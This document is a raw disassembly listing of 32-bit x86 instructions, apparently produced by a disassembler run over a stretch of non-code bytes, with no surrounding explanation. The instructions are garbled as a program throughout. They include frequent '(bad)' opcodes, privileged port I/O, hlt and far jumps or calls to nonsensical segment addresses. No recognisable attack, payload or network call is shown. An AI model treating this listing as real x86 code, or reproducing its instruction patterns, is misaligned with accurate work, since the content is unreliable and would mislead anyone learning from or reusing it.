  42181c:	xchg   ebp,eax
  42181d:	push   ss
  42181e:	sar    DWORD PTR [ebx],cl
  421820:	xchg   DWORD PTR [eax+ebp*4-0x18],edi
  421824:	pop    eax
  421825:	dec    ebp
  421826:	je     0x4218a0
  421828:	in     al,dx
  421829:	test   DWORD PTR [ebp+0x3e],ebp
  42182c:	ins    BYTE PTR es:[edi],dx
  42182d:	jno    0x4218a2
  42182f:	pcmpeqb mm1,QWORD PTR [ecx+0x40]
  421833:	shl    bl,1
  421835:	pop    ebx
  421836:	cmp    BYTE PTR [ebp-0x6811e7a3],0x19
  42183d:	stc    
  42183e:	les    edi,FWORD PTR [edi-0x9]
  421841:	or     dh,cl
  421843:	lock inc esp
  421845:	adc    BYTE PTR [ebx],bh
  421847:	sbb    eax,0x9a994aa9
  42184c:	add    al,0x6e
  42184e:	sub    al,0x43
  421850:	xor    dl,al
  421852:	mov    DWORD PTR [ebp+0x50093387],edi
  421858:	(bad)  
  42185a:	add    esi,DWORD PTR [esp+eax*2-0x71]
  42185e:	daa    
  42185f:	out    0x41,al
  421861:	mov    ebp,DWORD PTR [edx]
  421863:	popa   
  421864:	out    dx,eax
  421865:	arpl   WORD PTR [edx],dx
  421867:	pop    ss
  421868:	fs loopne 0x421866
  42186b:	call   0x6bbc594e
  421870:	sbb    DWORD PTR [edi],edx
  421872:	jmp    0xed170c87
  421877:	or     ebp,DWORD PTR [esi]
  421879:	hlt    
  42187a:	mov    edx,0x3fa344b0
  42187f:	mov    ds:0xa284991a,eax
  421884:	(bad)  
  421886:	sbb    BYTE PTR [edx+0x2dd9d174],0x88
  42188d:	push   ebx
  42188e:	or     DWORD PTR [esi],0x45bba2bf
  421894:	mov    al,0x10
  421896:	push   0xfffffff8
  421898:	ins    DWORD PTR es:[edi],dx
  421899:	std    
  42189a:	xchg   ebp,eax
  42189b:	das    
  42189c:	jne    0x4218d0
  42189e:	(bad)  
  42189f:	enter  0xafbc,0x7f
  4218a3:	sub    DWORD PTR [ebx+0x46],edx
  4218a6:	sbb    ch,al
  4218a8:	inc    ecx
  4218a9:	mov    DWORD PTR [ebp-0x3a5bf7b],esi
  4218af:	sub    ecx,eax
  4218b1:	stos   BYTE PTR es:[edi],al
  4218b2:	fcomp  QWORD PTR [ebx]
  4218b4:	sbb    DWORD PTR [edx],eax
  4218b6:	and    dh,BYTE PTR [ebx-0x39d2bc99]
  4218bc:	ss mov bh,0x4c
  4218bf:	mov    al,0x41
  4218c1:	or     esp,ebp
  4218c3:	loop   0x42187d
  4218c5:	mov    ebp,0xe0e8f96a
  4218ca:	jmp    0x6d6bd65e
  4218cf:	sub    al,0xe
  4218d1:	je     0x421872
  4218d3:	dec    ebx
  4218d4:	imul   esi,DWORD PTR [edx+0x1],0x57
  4218d8:	add    eax,0xff439955
  4218dd:	jecxz  0x421915
  4218df:	out    dx,al
  4218e0:	jno    0x42190a
  4218e2:	mov    cl,0xed
  4218e4:	cwde   
  4218e5:	sbb    al,0x1b
  4218e7:	xor    edi,DWORD PTR [edx]
  4218e9:	out    dx,eax
  4218ea:	das    
  4218eb:	enter  0xe55a,0x5f
  4218ef:	(bad)  
  4218f0:	repnz clc 
  4218f2:	inc    ebx
  4218f3:	mov    esi,0xef6350c3
  4218f8:	xlat   BYTE PTR gs:[ebx]
  4218fa:	jp     0x421890
  4218fc:	ret    0xcef6
  4218ff:	(bad)  
  421900:	aad    0xfe
  421902:	std    
  421903:	xchg   ecx,eax
  421904:	xchg   ebp,eax
  421905:	pop    esi
  421906:	mov    ebp,0xcd80d217
  42190b:	ds add ch,ch
  42190e:	outs   dx,DWORD PTR ds:[esi]
  42190f:	cmp    ecx,DWORD PTR [esi]
  421911:	les    edi,FWORD PTR [edi-0xe]
  421914:	jb     0x421934
  421916:	xchg   ebx,eax
  421917:	adc    DWORD PTR [ecx],0xffffffd1
  42191a:	bound  ebp,QWORD PTR [esi+0x70]
  42191d:	test   eax,0xa4aa361e
  421922:	jmp    0xcbe9410c
  421927:	(bad)  
  421928:	aam    0x0
  42192a:	inc    edi
  42192b:	clc    
  42192c:	and    eax,0xa2d3bc00
  421931:	sti    
  421932:	push   0x973b2054
  421937:	or     DWORD PTR [edi],esp
  421939:	xor    al,0x2d
  42193b:	pop    ds
  42193c:	pop    ecx
  42193d:	mov    al,ds:0x4aa4e976
  421942:	mov    BYTE PTR [edi],0x43
  421945:	mov    ch,0x52
  421947:	push   ecx
  421948:	(bad)  
  421949:	fsub   st,st(6)
  42194b:	cdq    
  42194c:	mov    ds:0xd54d787e,al
  421951:	adc    eax,0x67ba0f5
  421956:	cwde   
  421957:	imul   edx,DWORD PTR [edi-0x46bf8e5a],0xc939b780
  421961:	fsubr  QWORD PTR [esi+0x4680b159]
  421967:	mov    ch,0xda
  421969:	sub    eax,0xc5671b9c
  42196e:	xchg   esi,eax
  42196f:	pop    ss
  421970:	and    ebp,ebp
  421972:	or     BYTE PTR [ebx],dl
  421974:	mov    ds:0x4b0d2b80,eax
  421979:	sahf   
  42197a:	adc    ebx,DWORD PTR [esi-0x2d]
  42197d:	cwde   
  42197e:	sti    
  42197f:	cmp    BYTE PTR [ecx+0x7b7839ad],0x1e
  421986:	adc    ebp,DWORD PTR [edi-0x16173732]
  42198c:	push   cs
  42198d:	stc    
  42198e:	ficomp WORD PTR [esi]
  421990:	ror    BYTE PTR [ebp+edi*4-0x7c9cccec],1
  421997:	aas    
  421998:	xor    eax,0x80cc230a
  42199d:	or     DWORD PTR [ebx+0x10],ebx
  4219a0:	push   cs
  4219a1:	out    0xc7,al
  4219a3:	mov    ch,0x6f
  4219a5:	jg     0x421a20
  4219a7:	and    al,0xa3
  4219a9:	imul   BYTE PTR ss:[edi]
  4219ac:	mov    bl,0x6c
  4219ae:	add    esi,DWORD PTR [edx+0x358e1a24]
  4219b4:	fisttp DWORD PTR [ecx]
  4219b6:	nop
  4219b7:	out    0xbf,al
  4219b9:	adc    DWORD PTR [edi+0x198f1bd3],ecx
  4219bf:	loope  0x42194c
  4219c1:	out    dx,al
  4219c2:	cld    
  4219c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219c4:	test   eax,0x291b47fa
  4219c9:	pop    ecx
  4219ca:	xor    al,BYTE PTR [edi-0x68]
  4219cd:	mov    esp,0xaa489e8
  4219d2:	xchg   esi,eax
  4219d3:	fst    QWORD PTR [ebx]
  4219d5:	push   ebx
  4219d6:	shl    eax,cl
  4219d8:	pop    es
  4219d9:	adc    BYTE PTR [edi],ch
  4219db:	xchg   DWORD PTR [ebp-0x46],eax
  4219de:	neg    DWORD PTR [esi+esi*8]
  4219e1:	add    al,0xc9
  4219e3:	in     eax,dx
  4219e4:	sub    dh,BYTE PTR [ebx]
  4219e6:	dec    edx
  4219e7:	xchg   edi,eax
  4219e8:	cmp    BYTE PTR [eax+0x0],ah
  4219eb:	xor    dl,bl
  4219ed:	into   
  4219ee:	mov    ds:0xd37ebfef,al
  4219f3:	sub    edi,DWORD PTR [esi]
  4219f5:	out    0x3f,eax
  4219f7:	dec    eax
  4219f8:	shl    BYTE PTR [eax-0x61],0x38
  4219fc:	mov    ds:0x1e70001,al
  421a01:	add    BYTE PTR [eax],al
  421a03:	mov    al,0x8e
  421a05:	inc    ebx
  421a06:	call   0x434110b
  421a0b:	pop    edi
  421a0c:	or     BYTE PTR [edx-0x52],ah
  421a0f:	dec    ebp
  421a10:	addr16 loope 0x421a18
  421a13:	mov    esi,0x4a19751
  421a18:	cdq    
  421a19:	push   0xffffff8d
  421a1b:	mov    ds:0xd2189784,eax
  421a21:	cmp    BYTE PTR [ebp+0x1b],0x4e
  421a25:	ins    BYTE PTR es:[edi],dx
  421a26:	inc    edi
  421a27:	dec    ebx
  421a28:	cdq    
  421a29:	ret    0x48bf
  421a2c:	push   esi
  421a2d:	std    
  421a2e:	fiadd  WORD PTR [edi+0x66]
  421a31:	jl     0x4219cb
  421a33:	push   cs
  421a34:	lahf   
  421a35:	sub    ebp,DWORD PTR [edx]
  421a37:	sub    DWORD PTR [edx+ecx*4+0x3f],edx
  421a3b:	add    eax,0xd0ac910
  421a40:	adc    dl,BYTE PTR [esi-0x2dbc330f]
  421a46:	test   dh,dl
  421a48:	push   esp
  421a49:	sahf   
  421a4a:	aas    
  421a4b:	test   esp,esi
  421a4d:	mov    cl,0x74
  421a4f:	add    edi,ebx
  421a51:	(bad)  
  421a52:	xchg   ecx,eax
  421a53:	push   cs
  421a54:	push   es
  421a55:	ja     0x421a12
  421a57:	hlt    
  421a58:	jae    0x4219f3
  421a5a:	ficom  DWORD PTR [ebx+0x1d9c32f0]
  421a60:	shl    DWORD PTR [edx+0x65],0xf
  421a64:	dec    ebx
  421a65:	arpl   bx,cx
  421a67:	call   0x56e2dc69
  421a6c:	or     eax,edx
  421a6e:	sub    BYTE PTR cs:[edi],cl
  421a71:	adc    al,0x72
  421a73:	mov    WORD PTR [edx+0x1cd899b4],ss
  421a79:	test   al,0xe9
  421a7b:	cmp    al,0xf9
  421a7d:	(bad)  
  421a7e:	xlat   BYTE PTR ds:[ebx]
  421a7f:	mov    ds:0xd501eea5,eax
  421a84:	adc    ch,BYTE PTR [esi+0x739a2517]
  421a8a:	call   0xcb880882
  421a8f:	dec    ebp
  421a90:	sbb    BYTE PTR [ecx+0x1524f636],0xe3
  421a97:	xchg   ebp,edi
  421a99:	in     al,dx
  421a9a:	push   ebx
  421a9b:	test   BYTE PTR [ebp+0x60fe2672],bl
  421aa1:	push   eax
  421aa2:	repz test BYTE PTR [edx+eax*2],bl
  421aa6:	mov    ?,WORD PTR [ecx-0xa]
  421aa9:	mov    eax,ds:0x3e66c3d
  421aae:	inc    ecx
  421aaf:	nop
  421ab0:	pop    ecx
  421ab1:	sbb    al,0x8d
  421ab3:	jmp    0x8e81:0x783c0013
  421aba:	fdivr  DWORD PTR [eax]
  421abc:	dec    esp
  421abd:	or     dl,dl
  421abf:	and    eax,0x755d36ea
  421ac4:	sbb    eax,0x249ada83
  421ac9:	add    eax,0x89b39d0f
  421ace:	in     eax,dx
  421acf:	mov    dh,0xd3
  421ad1:	leave  
  421ad2:	push   eax
  421ad3:	hlt    
  421ad4:	inc    ebp
  421ad5:	shr    BYTE PTR [esi],1
  421ad7:	das    
  421ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ada:	adc    eax,0x5e8b00de
  421adf:	mov    dh,0x8
  421ae1:	ins    DWORD PTR es:[edi],dx
  421ae2:	fcmove st,st(6)
  421ae4:	les    esp,FWORD PTR [ecx+0x1706c329]
  421aea:	cli    
  421aeb:	push   ebx
  421aec:	sbb    al,0xcf
  421aee:	ret    
  421aef:	and    eax,0x7cb9ca0b
  421af4:	outs   dx,BYTE PTR ds:[esi]
  421af5:	push   ss
  421af6:	and    eax,DWORD PTR [ecx]
  421af8:	push   ebp
  421af9:	jno    0x421b43
  421afb:	sub    BYTE PTR [eax-0x1ec6e314],bh
  421b01:	cs int 0x2f
  421b04:	jg     0x421a9f
  421b06:	sub    ch,BYTE PTR ds:0x55539d90
  421b0c:	in     eax,0xaf
  421b0e:	add    eax,edi
  421b10:	loopne 0x421ac4
  421b12:	arpl   WORD PTR [esp+esi*8+0x93cc2d7],sp
  421b19:	mov    al,ds:0xf59c9
  421b1e:	popa   
  421b1f:	and    al,0x7e
  421b21:	jmp    0x6f44:0x8ada3f86
  421b28:	push   cs
  421b29:	lahf   
  421b2a:	xchg   BYTE PTR [ecx],ah
  421b2c:	or     al,0x1
  421b2e:	jge    0x421b64
  421b30:	fwait
  421b31:	test   al,0x3e
  421b33:	test   eax,0x11505ada
  421b38:	pop    ecx
  421b39:	popa   
  421b3a:	mov    ds:0xb9827f4d,eax
  421b3f:	js     0x421b5b
  421b41:	sub    DWORD PTR [esi+esi*1-0x17],esi
  421b45:	jne    0x421b0e
  421b47:	clc    
  421b48:	shl    BYTE PTR [edx+edx*1-0x56],0xdc
  421b4d:	jb     0x421b52
  421b4f:	jp     0x421b0f
  421b51:	arpl   WORD PTR [ebx-0x4839143d],sp
  421b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b58:	lahf   
  421b59:	xchg   ebx,eax
  421b5a:	mov    ebp,ebx
  421b5c:	jnp    0x421b05
  421b5e:	add    BYTE PTR [ebp+esi*1+0x1f32f5ed],dh
  421b65:	mov    ecx,DWORD PTR [ebp+0x0]
  421b68:	daa    
  421b69:	(bad)  
  421b6a:	mov    esi,0x68abbb33
  421b6f:	add    eax,ebx
  421b71:	pop    ebp
  421b72:	mov    BYTE PTR [esi+edi*4+0x693709c8],ch
  421b79:	repz test esi,esp
  421b7c:	and    edi,DWORD PTR [edx-0x26]
  421b7f:	addr16 sbb ebp,ecx
  421b82:	sbb    al,BYTE PTR [ecx+0x1f]
  421b85:	mov    edx,edi
  421b87:	xor    esp,DWORD PTR [edi+0x53]
  421b8a:	push   ebp
  421b8b:	inc    esi
  421b8c:	inc    ecx
  421b8d:	mov    edx,0xe85cd57e
  421b92:	xchg   ecx,eax
  421b93:	ja     0x421c14
  421b95:	sub    esi,DWORD PTR [edx]
  421b97:	sbb    eax,0xe598372d
  421b9c:	mov    esi,0x74e76283
  421ba1:	lock jb 0x421b45
  421ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ba5:	cmp    DWORD PTR [edx-0x29],0xffffff8d
  421ba9:	add    eax,0x7e5f9fab
  421bae:	dec    esp
  421baf:	and    eax,0x2fd61423
  421bb4:	aam    0xb2
  421bb6:	cmp    al,0x66
  421bb8:	mov    edx,0x976f2d1d
  421bbd:	das    
  421bbe:	sahf   
  421bbf:	mov    ebx,0x8bd235c9
  421bc4:	jle    0x421c30
  421bc6:	aaa    
  421bc7:	pop    ss
  421bc8:	cmp    dh,BYTE PTR [ebx-0x63652a1a]
  421bce:	(bad)  
  421bcf:	ror    BYTE PTR ds:0x2e4c07d8,1
  421bd5:	shl    BYTE PTR [edx+esi*1],0x99
  421bd9:	add    ah,BYTE PTR [ebp+0x151407b7]
  421bdf:	int    0x25
  421be1:	je     0x421bd4
  421be3:	sub    edx,DWORD PTR ds:0x42485334
  421be9:	dec    ebx
  421bea:	add    bl,bl
  421bec:	in     eax,dx
  421bed:	outs   dx,BYTE PTR ds:[esi]
  421bee:	and    bh,BYTE PTR [esi-0x5d]
  421bf1:	(bad)  
  421bf3:	pop    esi
  421bf4:	(bad)  
  421bf5:	mov    DWORD PTR [ebp+0x796ec225],ecx
  421bfb:	pop    ds
  421bfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bfd:	add    DWORD PTR [eax],eax
  421bff:	out    0x1,eax
  421c01:	add    BYTE PTR [eax],al
  421c03:	mov    bl,0x83
  421c05:	(bad)  
  421c06:	mov    ds:0xb2fca580,al
  421c0b:	out    0x86,eax
  421c0d:	pop    esp
  421c0e:	jne    0x421bb6
  421c10:	(bad)  
  421c11:	jmp    0x421bcc
  421c13:	lods   al,BYTE PTR ds:[esi]
  421c14:	mov    ecx,0x7b14930d
  421c19:	enter  0x6fc,0xa7
  421c1d:	and    ebp,DWORD PTR [esi+0x46ed05fb]
  421c23:	fs add eax,0x46b1a37
  421c29:	fld    TBYTE PTR [edx-0x41ead601]
  421c2f:	test   BYTE PTR [eax+edi*8+0x675e85b3],al
  421c36:	push   ds
  421c37:	cld    
  421c38:	imul   esp,DWORD PTR [ebx-0x2508d4f5],0x983deb93
  421c42:	imul   edx,DWORD PTR [eax-0xc34bbae],0x7bd2fa11
  421c4c:	mov    eax,ds:0x2c50e124
  421c51:	dec    ebx
  421c52:	inc    esi
  421c53:	or     dl,BYTE PTR [ecx]
  421c55:	sbb    ebx,0x30f00008
  421c5b:	es ret 
  421c5d:	ret    
  421c5e:	jmp    0xda31e3ce
  421c63:	es loopne 0x421c87
  421c66:	mov    WORD PTR [edx+0x7e],es
  421c69:	pop    es
  421c6a:	scas   eax,DWORD PTR es:[edi]
  421c6b:	out    dx,eax
  421c6c:	data16 test BYTE PTR [ebx+0x54ab805a],0xb4
  421c74:	pop    ds
  421c75:	dec    edi
  421c76:	and    ebp,DWORD PTR [ebp+0x68]
  421c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c7a:	dec    ebp
  421c7b:	push   ebp
  421c7c:	js     0x421c6e
  421c7e:	mov    dl,BYTE PTR [edx-0x68]
  421c81:	dec    edx
  421c82:	mov    dh,0x0
  421c84:	rcr    BYTE PTR [esi+edi*2],0x8d
  421c88:	push   esi
  421c89:	in     al,0xe7
  421c8b:	sti    
  421c8c:	outs   dx,BYTE PTR ds:[esi]
  421c8d:	icebp  
  421c8e:	mov    ebx,0x9461d4af
  421c93:	fisubr WORD PTR [ebp-0x79]
  421c96:	call   0x49ab7ffc
  421c9b:	pop    ecx
  421c9c:	sub    esi,0xfaebdd00
  421ca2:	cmp    DWORD PTR [ecx],ebx
  421ca4:	xlat   BYTE PTR ds:[ebx]
  421ca5:	push   esi
  421ca6:	sub    BYTE PTR [ecx+0x4ce9028a],bh
  421cac:	arpl   WORD PTR [edx+eiz*2-0x520999f1],sp
  421cb3:	dec    edx
  421cb4:	inc    eax
  421cb5:	imul   esp,DWORD PTR [eax],0xbd44319e
  421cbb:	shl    DWORD PTR [ebx-0x69],1
  421cbe:	in     eax,0xd9
  421cc0:	imul   eax,DWORD PTR [eax-0xc24fa13],0xe6a60506
  421cca:	push   es
  421ccb:	les    ebx,FWORD PTR cs:[edx-0x1c3e9ec0]
  421cd2:	cmp    esi,ebp
  421cd4:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cd6:	icebp  
  421cd7:	lea    edx,[edi+0x3234aee3]
  421cdd:	inc    ebp
  421cde:	pop    ds
  421cdf:	or     ebp,eax
  421ce1:	xor    al,ah
  421ce3:	lea    ecx,[ebx]
  421ce5:	xchg   esi,eax
  421ce6:	jg     0x421cd9
  421ce8:	ins    BYTE PTR es:[edi],dx
  421ce9:	jmp    0x5118:0xa26d2b90
  421cf0:	mov    al,ds:0xc7d420dd
  421cf5:	cmp    al,0x68
  421cf7:	add    BYTE PTR [ecx-0x7f],cl
  421cfa:	call   0xc4f:0x1209fde1
  421d01:	push   ecx
  421d02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d03:	jbe    0x421c9d
  421d05:	push   es
  421d06:	add    al,0xb7
  421d08:	in     al,dx
  421d09:	fcomp  DWORD PTR [ecx+0x61a3746e]
  421d0f:	call   0x3a35:0xe7cadb0b
  421d16:	pusha  
  421d17:	mov    esi,0xdf2c2c08
  421d1c:	stos   BYTE PTR es:[edi],al
  421d1d:	clc    
  421d1e:	je     0x421d81
  421d20:	mov    eax,DWORD PTR [bx+di]
  421d23:	mov    DWORD PTR [ebx-0x31],edx
  421d26:	add    BYTE PTR [edi],dh
  421d28:	int    0xca
  421d2a:	jmp    0xfa50b197
  421d2f:	and    DWORD PTR [esi],0xffffffdc
  421d32:	in     al,dx
  421d33:	pop    edi
  421d34:	pusha  
  421d35:	dec    edi
  421d36:	or     ch,BYTE PTR [eax+0x35]
  421d39:	inc    ebp
  421d3a:	dec    esp
  421d3b:	and    ch,BYTE PTR [ebp-0x4]
  421d3e:	sub    DWORD PTR [ebx+0x44ff0ad1],0x58
  421d45:	clc    
  421d46:	(bad)  
  421d47:	sbb    esi,DWORD PTR [esi]
  421d49:	jp     0x421d9b
  421d4b:	xchg   ecx,eax
  421d4c:	xchg   esi,eax
  421d4d:	mov    ds:0x7d426eaf,al
  421d52:	or     al,0xf7
  421d54:	pop    eax
  421d55:	sti    
  421d56:	push   ecx
  421d57:	cmp    ebx,edx
  421d59:	sub    eax,0xe2771330
  421d5e:	nop
  421d5f:	mov    dl,al
  421d61:	sar    DWORD PTR [eax-0x77ed6739],cl
  421d67:	add    dl,BYTE PTR [edx+0x40]
  421d6a:	xor    DWORD PTR [edx],edx
  421d6c:	shr    DWORD PTR [ebx+0x9874ec9],1
  421d72:	lock mov ebx,0xeaecdafe
  421d78:	shr    BYTE PTR [ebx+0x5ca94821],cl
  421d7e:	sub    BYTE PTR [eax+0x14],bh
  421d81:	push   0xb43555e4
  421d86:	and    eax,0x1b538072
  421d8b:	ret    0xa705
  421d8e:	imul   ebp,ebp,0x574f0324
  421d94:	mov    ebx,0xa63f5329
  421d99:	ficomp DWORD PTR [ebp+0x377fe1da]
  421d9f:	mov    ebx,0xb3fbe011
  421da4:	in     al,0x40
  421da6:	jno    0x421dc7
  421da8:	repz jbe 0x421e17
  421dab:	push   eax
  421dac:	jl     0x421d8a
  421dae:	ds inc ebp
  421db0:	sub    cl,BYTE PTR [ebx-0x105e0220]
  421db6:	fisttp DWORD PTR [ecx+0x42492860]
  421dbc:	mov    dh,0x78
  421dbe:	ret    0x745f
  421dc1:	sub    ch,BYTE PTR [esi-0x68]
  421dc4:	ficomp DWORD PTR [edi]
  421dc6:	out    dx,eax
  421dc7:	outs   dx,BYTE PTR ds:[esi]
  421dc8:	mov    ds:0xee5e7956,al
  421dcd:	sbb    eax,DWORD PTR [esi]
  421dcf:	fadd   DWORD PTR [edi+0x75]
  421dd2:	sbb    bh,BYTE PTR [esi]
  421dd4:	leave  
  421dd5:	sar    BYTE PTR [ebx-0x28e96766],cl
  421ddb:	lods   al,BYTE PTR ds:[esi]
  421ddc:	test   DWORD PTR [eax+0x39ed5247],ebx
  421de2:	mov    DWORD PTR [edi+0x2fa5129a],esi
  421de8:	push   esi
  421de9:	xchg   BYTE PTR [eax],al
  421deb:	add    eax,0x6f976b22
  421df0:	(bad)  
  421df2:	mov    dl,0x66
  421df4:	and    BYTE PTR [esi-0x4e590d96],ah
  421dfa:	lock push es
  421dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dfd:	add    DWORD PTR [eax],eax
  421dff:	out    0x1,eax
  421e01:	add    BYTE PTR [eax],al
  421e03:	sub    dl,BYTE PTR [edx-0x14]
  421e06:	add    eax,0x39200dd9
  421e0b:	(bad)  
  421e0c:	rol    DWORD PTR [eax+0x3b],1
  421e0f:	adc    al,0xd3
  421e11:	and    al,0x16
  421e13:	call   0xd456510e
  421e18:	into   
  421e19:	push   esi
  421e1a:	pop    ecx
  421e1b:	sub    ebx,DWORD PTR [edx]
  421e1d:	cwde   
  421e1e:	sub    DWORD PTR [edx],0x0
  421e21:	lods   al,BYTE PTR ds:[esi]
  421e22:	outs   dx,BYTE PTR ds:[esi]
  421e23:	test   BYTE PTR [ebx],cl
  421e25:	jge    0x421e2b
  421e27:	xchg   BYTE PTR [esi-0x19],bl
  421e2a:	mov    al,ds:0xacea7464
  421e2f:	and    DWORD PTR [ebx],ecx
  421e31:	out    dx,eax
  421e32:	in     al,0x38
  421e34:	mov    DWORD PTR [esi],0x58a0bbcc
  421e3a:	imul   ecx,DWORD PTR [esi-0x6ff34792],0xe6e5a79f
  421e44:	mov    edi,0x81520004
  421e49:	dec    edx
  421e4a:	xor    eax,0xc4ee0890
  421e4f:	es in  eax,dx
  421e51:	into   
  421e52:	outs   dx,DWORD PTR ds:[esi]
  421e53:	or     al,0x5d
  421e55:	ja     0x421eca
  421e57:	xor    DWORD PTR [edx],edx
  421e59:	ret    0x7fa6
  421e5c:	jno    0x421e90
  421e5e:	cmp    dh,ah
  421e60:	push   esp
  421e61:	jno    0x421e8e
  421e63:	loope  0x421eb4
  421e65:	and    edx,edi
  421e67:	or     al,0x61
  421e69:	ficom  WORD PTR [edi+0x235a1c36]
  421e6f:	shl    DWORD PTR [eax+edx*4+0x62],cl
  421e73:	inc    edi
  421e74:	or     ebx,ebx
  421e76:	scas   al,BYTE PTR es:[edi]
  421e77:	dec    esi
  421e78:	adc    al,0xd2
  421e7a:	retf   
  421e7b:	cmp    eax,0x7104a929
  421e80:	ss add al,0xd6
  421e83:	and    al,0x22
  421e85:	dec    edi
  421e86:	xchg   DWORD PTR [edx],esp
  421e88:	push   0xc9c0a6b2
  421e8d:	nop
  421e8e:	inc    eax
  421e8f:	push   esi
  421e90:	cmp    ecx,ebp
  421e92:	cmp    ah,BYTE PTR [eax+0x27bad11e]
  421e98:	test   BYTE PTR [ecx-0x7cdb2356],ch
  421e9e:	jnp    0x421f00
  421ea0:	mov    BYTE PTR [esi],0x50
  421ea3:	(bad)  
  421ea5:	sub    eax,0xbe57cc73
  421eaa:	sahf   
  421eab:	or     DWORD PTR [edx+0x2c],eax
  421eae:	or     cl,bh
  421eb0:	je     0x421e6d
  421eb2:	mov    ah,0x3a
  421eb4:	loope  0x421f2f
  421eb6:	push   cs
  421eb7:	mov    ds:0xb1aca089,eax
  421ebc:	and    ah,dh
  421ebe:	mov    esi,0xf3d8e7c3
  421ec3:	ss mov bl,0xff
  421ec6:	js     0x421f21
  421ec8:	jge    0x421ed3
  421eca:	fistp  WORD PTR [ebp+0xc67dc07]
  421ed0:	call   DWORD PTR [edi+0x600d23b0]
  421ed6:	xchg   esp,eax
  421ed7:	fwait
  421ed8:	mov    cs,WORD PTR gs:[ecx-0x19]
  421edc:	xor    DWORD PTR ds:0x1fc189f8,ebp
  421ee2:	out    0xe2,eax
  421ee4:	rcl    BYTE PTR [edi+0x47],0x1f
  421ee8:	fsub   QWORD PTR [edi]
  421eea:	pop    es
  421eeb:	cmc    
  421eec:	imul   edi,DWORD PTR [edi+0x1bf6b8c5],0xffffffb9
  421ef3:	mov    ds:0x343fbd33,al
  421ef8:	nop
  421ef9:	aam    0xb3
  421efb:	inc    edx
  421efc:	dec    esp
  421efd:	jmp    0x278f5d8a
  421f02:	popa   
  421f03:	sti    
  421f04:	nop
  421f05:	out    dx,eax
  421f06:	in     al,dx
  421f07:	sub    sp,WORD PTR [ecx+ebp*2+0x1097cf]
  421f0f:	cld    
  421f10:	pop    esp
  421f11:	(bad)  
  421f12:	lock push esp
  421f14:	das    
  421f15:	cld    
  421f16:	cmp    bh,BYTE PTR [esi+0x50567916]
  421f1c:	loopne 0x421eca
  421f1e:	mov    ebx,ebx
  421f20:	call   0x16bd2406
  421f25:	mov    esp,0xc563d1e0
  421f2a:	jl     0x421f39
  421f2c:	into   
  421f2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f2e:	mov    edi,0xbc3bbf6
  421f33:	jl     0x421f2a
  421f35:	cmc    
  421f36:	jl     0x421f2b
  421f38:	imul   edi,DWORD PTR [ebx],0x1f716e6d
  421f3e:	repz xchg edi,eax
  421f40:	dec    esp
  421f41:	fwait
  421f42:	call   DWORD PTR [edi]
  421f44:	jo     0x421f2d
  421f46:	pop    ds
  421f47:	ret    
  421f48:	sub    eax,0x5180ac24
  421f4d:	out    0x3f,eax
  421f4f:	jnp    0x421f94
  421f51:	mov    ecx,DWORD PTR [ecx+ebp*1]
  421f54:	xchg   ebp,eax
  421f55:	fidiv  DWORD PTR [edx]
  421f57:	fst    QWORD PTR [eax]
  421f59:	test   DWORD PTR [edx],ecx
  421f5b:	pop    edx
  421f5c:	aas    
  421f5d:	inc    edi
  421f5e:	jg     0x421f2e
  421f60:	pop    ecx
  421f61:	pusha  
  421f62:	ret    
  421f63:	ja     0x421f35
  421f65:	ror    DWORD PTR [eax-0x24],0x2
  421f69:	bound  ebx,QWORD PTR [esi+0x4]
  421f6c:	hlt    
  421f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f6e:	jl     0x421eff
  421f70:	ss enter 0x7c3c,0xf6
  421f75:	das    
  421f76:	in     eax,dx
  421f77:	es in  al,dx
  421f79:	cmp    eax,0x3636801f
  421f7e:	pop    eax
  421f7f:	push   edx
  421f80:	mov    edi,0x6989a97e
  421f85:	pop    ds
  421f86:	mov    bl,0xde
  421f88:	jmp    0x421fd5
  421f8a:	push   edx
  421f8b:	sub    eax,0x1cb4d1ca
  421f90:	cdq    
  421f91:	jno    0x421f28
  421f93:	retf   
  421f94:	jae    0x421f42
  421f96:	jbe    0x421fce
  421f98:	ret    0x8454
  421f9b:	push   0xd350b85
  421fa0:	jb     0x421f23
  421fa2:	cmp    al,0xd8
  421fa4:	sub    DWORD PTR [esi-0x17bf6778],ecx
  421faa:	jmp    0xb218:0x9914c345
  421fb1:	mov    ah,0xae
  421fb3:	push   eax
  421fb4:	sub    dl,BYTE PTR [eax+0x59]
  421fb7:	sub    dl,bh
  421fb9:	retf   
  421fba:	pop    edx
  421fbb:	repz jl 0x421f44
  421fbe:	cmp    al,0x5d
  421fc0:	es dec edx
  421fc2:	loope  0x421fc5
  421fc4:	xchg   esp,eax
  421fc5:	shl    BYTE PTR [esi-0x1d],1
  421fc8:	sti    
  421fc9:	dec    ebp
  421fca:	leave  
  421fcb:	mov    al,ds:0x3cd16df4
  421fd0:	sub    BYTE PTR [edi+0x70],bh
  421fd3:	and    esp,0xf2cee485
  421fd9:	imul   edx,edx,0xffffffa6
  421fdc:	mov    DWORD PTR [edx+0x60],eax
  421fdf:	xchg   ebx,eax
  421fe0:	rcr    bl,1
  421fe2:	dec    esp
  421fe3:	cmp    DWORD PTR [eax-0x370f8289],edi
  421fe9:	push   0x0
  421feb:	mov    edx,esp
  421fed:	and    al,0xd9
  421fef:	jg     0x421fea
  421ff1:	call   esi
  421ff3:	into   
  421ff4:	inc    ebp
  421ff5:	mov    bh,0x11
  421ff7:	or     dl,BYTE PTR [edi+0xb]
  421ffa:	ja     0x421fe9
  421ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ffd:	add    DWORD PTR [eax],eax
  421fff:	out    0x1,eax
  422001:	add    BYTE PTR [eax],al
  422003:	adc    bl,BYTE PTR [edx+ebp*1-0x71850292]
  42200a:	clc    
  42200b:	jns    0x422023
  42200d:	xor    cl,ah
  42200f:	dec    esp
